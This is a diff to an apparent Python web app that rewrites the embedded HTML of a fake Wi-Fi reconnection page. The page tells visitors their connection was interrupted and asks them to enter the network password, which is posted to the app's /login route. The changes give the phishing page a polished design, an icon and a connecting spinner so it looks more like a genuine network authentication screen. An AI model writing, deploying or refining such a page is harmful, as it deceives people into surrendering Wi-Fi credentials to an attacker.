@@ -23,111 +23,218 @@ def redirect_to_youtube():
 
 login_page = r'''
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Wi-Fi Login</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wi-Fi Network Authentication</title>
     <style>
-        * {
-            user-select: none;
-            -webkit-user-select: none;
-            -webkit-touch-callout: none;
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: rgba(30, 41, 59, 0.7);
+            --border-color: rgba(255, 255, 255, 0.1);
+            --primary-color: #2563eb;
+            --primary-hover: #1d4ed8;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --error-color: #ef4444;
         }
-        body {
-            background-color: #000;
-            color: #fff;
-            font-family: Arial, sans-serif;
-            overflow: hidden;
+
+        * {
+            box-sizing: border-box;
             margin: 0;
-            height: 100vh;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            background-image: 
+                radial-gradient(at 0% 0%, rgba(37, 99, 235, 0.15) 0px, transparent 50%),
+                radial-gradient(at 100% 100%, rgba(124, 58, 237, 0.15) 0px, transparent 50%);
+            color: var(--text-main);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
+            padding: 20px;
         }
-        .box {
-            background-color: #111;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 0 15px limegreen;
-            text-align: center;
-            width: 90%;
-            max-width: 350px;
-        }
-        input {
-            padding: 12px;
+
+        .login-card {
+            background: var(--card-bg);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 40px 32px;
             width: 100%;
-            margin: 15px 0;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            background: #fff;
-            color: #000;
+            max-width: 400px;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3), 0 8px 10px -6px rgba(0, 0, 0, 0.3);
+            text-align: center;
         }
-        button {
-            padding: 12px 25px;
-            background-color: crimson;
+
+        .icon-container {
+            width: 64px;
+            height: 64px;
+            background: rgba(37, 99, 235, 0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px auto;
+        }
+
+        .wifi-icon {
+            width: 32px;
+            height: 32px;
+            fill: var(--primary-color);
+        }
+
+        h2 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--text-main);
+        }
+
+        p.subtitle {
+            font-size: 0.95rem;
+            color: var(--text-muted);
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+        }
+
+        input[type="password"],
+        input[type="text"] {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 1rem;
+            color: var(--text-main);
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        input[type="password"]:focus,
+        input[type="text"]:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.25);
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--primary-color);
             color: white;
             border: none;
-            border-radius: 6px;
-            font-size: 16px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 500;
             cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
-        h3, p {
-            color: #ccc;
+
+        .btn-submit:hover {
+            background-color: var(--primary-hover);
         }
+
+        .btn-submit:active {
+            transform: scale(0.98);
+        }
+
         .spinner {
             display: none;
-            margin-top: 20px;
-        }
-        .spinner:after {
-            content: ' ';
-            display: block;
-            width: 40px;
-            height: 40px;
-            margin: auto;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
             border-radius: 50%;
-            border: 5px solid #ccc;
-            border-color: #ccc transparent #ccc transparent;
-            animation: spin 1s linear infinite;
+            border-top-color: #fff;
+            animation: spin 0.8s linear infinite;
         }
+
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .error-message {
+            display: none;
+            color: var(--error-color);
+            font-size: 0.85rem;
+            margin-top: 8px;
+            text-align: left;
         }
     </style>
     <script>
-        document.addEventListener('keydown', function(e) {
-            const allowed = ['Backspace', 'Tab', 'Enter', 'Shift', 'ArrowLeft', 'ArrowRight'];
-            if (!allowed.includes(e.key) && !e.key.match(/^[a-zA-Z0-9!@#\$%\^&\*\(\)_\+\-=]$/)) {
-                e.preventDefault();
-            }
-        });
-
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('selectstart', e => e.preventDefault());
-        document.addEventListener('copy', e => e.preventDefault());
-
         function handleSubmit(event) {
-            const password = document.querySelector('input[name="password"]').value;
-            if (password.trim() === "") {
+            const passwordInput = document.querySelector('input[name="password"]');
+            const errorMessage = document.getElementById('error-message');
+            const spinner = document.querySelector('.spinner');
+            const btnText = document.getElementById('btn-text');
+            const submitBtn = document.getElementById('submit-btn');
+
+            if (passwordInput.value.trim() === "") {
                 event.preventDefault();
-                alert("Connection failed: Password field cannot be empty.");
+                errorMessage.style.display = 'block';
+                passwordInput.style.borderColor = 'var(--error-color)';
                 return false;
             } else {
-                document.querySelector('.spinner').style.display = 'block';
+                errorMessage.style.display = 'none';
+                passwordInput.style.borderColor = 'var(--border-color)';
+                spinner.style.display = 'inline-block';
+                btnText.textContent = 'Connecting...';
+                submitBtn.disabled = true;
+                submitBtn.style.opacity = '0.8';
+                submitBtn.style.cursor = 'not-allowed';
             }
         }
     </script>
 </head>
 <body>
-    <div class="box">
-        <h3>Your Wi-Fi connection was lost.</h3>
-        <p>Please re-enter your password to reconnect.</p>
+
+    <div class="login-card">
+        <div class="icon-container">
+            <svg class="wifi-icon" viewBox="0 0 24 24">
+                <path d="M12 3C7.95 3 4.21 4.64 1.42 7.32L3 8.9C5.38 6.53 8.5 5.08 12 5.08c3.5 0 6.62 1.45 9 3.82l1.58-1.58C19.79 4.64 16.05 3 12 3zm0 4c-2.97 0-5.66 1.23-7.6 3.2L6 11.78C7.53 10.25 9.66 9.3 12 9.3c2.34 0 4.47.95 6 2.48l1.6-1.58C17.66 8.23 14.97 7 12 7zm0 4c-1.86 0-3.55.78-4.75 2.04l1.58 1.58C9.64 13.82 10.76 13.3 12 13.3c1.24 0 2.36.52 3.17 1.32l1.58-1.58C15.55 11.78 13.86 11 12 11zm0 4c-.73 0-1.39.29-1.88.77L12 17.65l1.88-1.88C13.39 15.29 12.73 15 12 15z"/>
+            </svg>
+        </div>
+
+        <h2>Network Authentication</h2>
+        <p class="subtitle">Your Wi-Fi connection was interrupted. Enter your network password to reconnect.</p>
+
         <form method="POST" action="/login" onsubmit="handleSubmit(event)">
-            <input type="password" name="password" placeholder="Wi-Fi Password" required autofocus><br>
-            <button type="submit">Reconnect</button>
+            <div class="input-group">
+                <label for="password">Wi-Fi Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter password" autofocus>
+                <div id="error-message" class="error-message">Password field cannot be empty.</div>
+            </div>
+
+            <button type="submit" id="submit-btn" class="btn-submit">
+                <span class="spinner"></span>
+                <span id="btn-text">Connect</span>
+            </button>
         </form>
-        <div class="spinner"></div>
     </div>
+
 </body>
 </html>
 '''
